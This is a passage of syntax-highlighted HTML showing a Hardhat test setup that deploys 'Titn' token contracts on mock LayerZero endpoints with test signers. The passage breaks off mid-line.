{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Constant representing a mock Endpoint ID for testing purposes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Other variables to be used in the test suite\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eendpointOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Before hook for setup that runs once before all tests in the block\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Contract factory for our tested contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Titn\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;MergeTgt\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Tgt\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the first three signers (accounts) from Hardhat\u0026#39;s local Ethereum network\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ;[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eendpointOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esigners\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The EndpointV2Mock contract comes from @layerzerolabs/test-devtools-evm-hardhat package\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// and its artifacts are connected as external artifacts to this project\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2MockArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployments\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;EndpointV2Mock\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2MockArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2MockArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytecode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eendpointOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploying a mock LZEndpoint with the given Endpoint ID\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploying two instances of the TITN contract with different identifiers and linking them to the mock LZEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;baseTitn\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;baseTITN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;arbTitn\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;arbTITN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Setting destination endpoints in the LZEndpoint mock for each TITN instance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDestLzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan 